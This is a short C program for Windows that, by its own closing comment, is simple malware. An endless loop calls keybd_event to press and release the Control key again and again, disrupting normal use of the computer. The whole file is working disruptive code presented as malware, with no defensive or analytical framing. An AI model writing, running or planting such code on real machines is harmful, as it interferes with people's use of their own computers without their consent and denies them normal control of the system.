#include <stdio.h>
#include <Windows.h>

int main()
{
while(1)
{
keybd_event(VK_CONTROL, 0x9d, 0, 0);
keybd_event(VK_CONTROL, 0x9d, KEYEVENTF_KEYUP, 0);
}
return 0;
}
/*
This source code is an example of a simple Windows malware program that continuously triggers the control key to disrupt the normal functioning of the computer.
*/
